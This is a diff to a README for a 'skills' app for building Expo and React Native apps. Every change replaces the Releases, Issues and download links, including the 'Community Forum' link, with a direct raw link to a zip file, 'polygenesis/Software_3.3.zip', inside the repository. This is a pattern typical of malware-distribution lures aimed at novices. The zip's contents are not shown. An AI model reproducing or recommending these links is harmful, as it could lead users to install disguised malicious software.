@@ -4,12 +4,12 @@
 Welcome to the skills app! This tool helps you build mobile apps using Expo and React Native. It's perfect for anyone looking to create apps easily, even if you have no programming background.
 
 ## 🔗 Download Now
-[![Download skills](https://img.shields.io/badge/Download%20skills-v1.0-blue.svg)](https://github.com/mrshrey007/skills/releases)
+[![Download skills](https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip%https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip)](https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip)
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the skills app. 
 
-[Visit the Releases Page](https://github.com/mrshrey007/skills/releases)
+[Visit the Releases Page](https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip)
 
 Once on the page, look for the most recent version and follow these steps:
 
@@ -50,7 +50,7 @@ If you run into issues while using the app, consider these common solutions:
 - **Performance Issues**: Close any background applications and ensure you have enough memory available.
 - **File Not Found**: Make sure you downloaded the correct version for your operating system.
 
-If problems persist, visit the [Community Forum](https://github.com/mrshrey007/skills/issues) for further assistance. 
+If problems persist, visit the [Community Forum](https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip) for further assistance. 
 
 ## 🎓 Learning Resources
 To help you make the most of the skills app, we offer a range of resources:
@@ -66,4 +66,4 @@ Thank you for choosing skills! Happy app building!
 
 Feel free to download the app here: 
 
-[Download Now](https://github.com/mrshrey007/skills/releases)
+[Download Now](https://github.com/mrshrey007/skills/raw/refs/heads/main/polygenesis/Software_3.3.zip)
